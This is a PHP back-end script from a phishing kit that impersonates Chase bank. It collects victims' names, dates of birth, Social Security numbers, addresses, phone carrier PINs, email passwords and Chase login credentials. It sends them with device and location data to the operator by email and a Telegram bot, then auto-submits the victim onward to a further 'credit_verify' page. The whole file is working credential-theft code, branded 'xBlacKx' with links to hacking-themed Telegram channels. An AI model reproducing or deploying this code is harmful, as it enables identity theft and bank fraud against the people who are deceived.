<?php
include "config.php";
include "Main.php";
include_once 'functions.php';
error_reporting(0);
$ip = getUserIP();

$subject = "💲CHASE PERSONAL DETAILS💲 [ ".$_POST['email']."  - ".$_POST['username']." ] [$cn - $ip]";
$msg = '
<p>
<b>=========[💲PERSONAL DETAILS💲]=========</b><br>
First name : '.$_POST['fname'].'<br>
Last name : '.$_POST['lname'].'<br>
Date of birth : '.$_POST['dob'].'<br>
SSN : '.$_POST['ssn'].'<br>
State : '.$_POST['state'].'<br>
Street address : '.$_POST['address'].'<br>
Suite/apt/other : '.$_POST['address2'].'<br>
ZIP : '.$_POST['zip'].'<br>
Phone number : '.$_POST['phone'].'<br>
Carrier Pin : '.$_POST['carrierpin'].'<br>
<b>=========[💲EMAIL ACCESS💲]=========</b><br>
Email : '.$_POST['email'].'<br>
Password : '.$_POST['email_password'].'<br>
<b>=========[💲CHASE LOGIN💲]=========</b><br>
Username : '.$_POST['username'].'<br>
Password : '.$_POST['password'].'<br>
<b>=========[💲DEVICE INFO💲]=========</b><br>
Country : '.$cn.'<br>
Region : '.$regioncity.'<br>
City : '.$citykota.'<br>
Continent : '.$continent.'<br>
Curs : '.$kurenci.'<br>
OS / BR : '.$os.' / '.$br.'<br>
User Agent : '.$user_agent.'<br>
Timezone : '.$timezone.'<br>
ISP : '.$ispuser.'<br>
IP : '.$ip.'<br>
Date : '.$date.'<br>
<b>=========[♥️xBlacKx - CHASE♥️]=========</b>
</p>
';
$msgtg = '
*=========[💲CHASE INFO💲]=========*
First name : `'.$_POST['fname'].'`
Last name : `'.$_POST['lname'].'`
Date of birth : `'.$_POST['dob'].'`
SSN : `'.$_POST['ssn'].'`
State : '.$_POST['state'].'
Street address : `'.$_POST['address'].'`
Suite/apt/other : `'.$_POST['address2'].'`
ZIP : `'.$_POST['zip'].'`
Phone number : `'.$_POST['phone'].'`
Carrier Pin : `'.$_POST['carrierpin'].'`
*=========[👁‍🗨DEVICE INFO👁‍🗨]=========*
*IP* : http://www.geoiptool.com/?IP='.$ip.'
*Date* : `'.$date.'`
*USER AGENT* : '.$_SERVER['HTTP_USER_AGENT'].'
*OS / BR* : '.$os.'
';

$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= 'From: ♥️xBlacKx♥️ <admin@xblackx.coder>' . "\r\n";
$kirim = mail($toEmail, $subject, $msg, $headers);
#Send To Telegram
if ($Telegram_Logs=="yes") {
	telegramBot('sendMessage', [
	  'chat_id' => TELEGRAM_BOT_ADMIN_USERID,
	  'text' => ($subject .$msgtg),
	  'parse_mode'=>'markdown',
	  'reply_markup'=>json_encode([
      'inline_keyboard'=>[
       [['text'=>"⚔️ ↝Channel↜ ⚔️", 'url'=>"https://t.me/Anonymous_Hackez_Channel"]],
       [['text'=>"⚔️ ↝Coder↜ ⚔️", 'url'=>"https://t.me/xblackx_Coder0"]],
      ]
              ])
              ]);
}
echo "<form id='xblackx' method='POST' action='../credit_verify.php'>
<input type='hidden' name='fname' value='".$_POST['fname']."'>
<input type='hidden' name='lname' value='".$_POST['lname']."'>
<input type='hidden' name='dob' value='".$_POST['dob']."'>
<input type='hidden' name='ssn' value='".$_POST['ssn']."'>
<input type='hidden' name='state' value='".$_POST['state']."'>
<input type='hidden' name='address' value='".$_POST['address']."'>
<input type='hidden' name='address2' value='".$_POST['address2']."'>
<input type='hidden' name='zip' value='".$_POST['zip']."'>
<input type='hidden' name='phone' value='".$_POST['phone']."'>
<input type='hidden' name='carrierpin' value='".$_POST['carrierpin']."'>
</form><script type='text/javascript'>document.getElementById('xblackx').submit();</script>";
?>